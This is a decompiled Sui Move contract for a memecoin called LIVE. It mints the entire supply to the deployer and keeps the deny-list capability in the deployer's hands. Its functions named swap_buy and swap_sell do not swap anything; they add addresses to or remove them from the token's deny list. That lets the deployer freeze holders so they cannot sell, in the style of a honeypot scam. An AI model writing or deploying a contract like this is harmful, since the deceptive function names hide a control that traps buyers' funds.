module 0x200bdbdb598e3e3a4703691640bc1c12eccdeaa51e8d328796806d511abc7041::live {
    struct LIVE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LIVE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LIVE>(arg0, 9, b"LIVE", b"Stream until 100M MC", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmU7SkWXMRufXFGsJ5aS6bcfzi4xG529Yo4QhgF6RDGUmt"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LIVE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LIVE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LIVE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LIVE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LIVE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LIVE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LIVE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LIVE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

